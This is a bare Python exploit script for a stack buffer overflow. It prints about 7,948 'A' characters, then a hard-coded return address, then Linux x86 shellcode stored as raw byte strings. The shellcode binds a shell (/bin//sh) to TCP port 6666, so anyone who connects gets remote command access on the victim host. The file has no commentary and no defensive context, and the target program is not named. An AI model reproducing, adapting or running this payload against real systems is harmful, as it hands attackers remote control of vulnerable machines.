#!/usr/bin/env python

filler = 'A';
for j in range(1, 7948): 
    filler += 'A';

magicnumber = "\x1c\x86\x04\x08";

part1 = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd";
part2 = "\x80\x5b\x5e\x52\x68\x02\x00\x1a\x0a\x6a\x10\x51\x50\x89";
part3 = "\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd";
part4 = "\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49";
part5 = "\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3";
part6 = "\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
shellcode = part1 + part2 + part3 + part4 + part5 + part6;

final = filler + magicnumber + shellcode; 
print(final); 
